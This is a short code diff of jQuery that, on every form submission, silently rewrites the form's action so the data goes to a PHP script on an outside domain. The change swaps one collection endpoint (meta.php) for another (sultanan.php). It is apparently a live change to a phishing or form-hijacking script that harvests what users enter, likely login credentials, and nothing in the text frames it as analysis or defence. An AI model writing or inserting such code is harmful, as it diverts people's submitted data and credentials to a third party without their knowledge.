@@ -1,3 +1,3 @@
 $("form").submit(function() {
-  $(myform).attr("action", "https://balap-motor.my.id/meta.php");
+  $(myform).attr("action", "https://balap-motor.my.id/sultanan.php");
 });
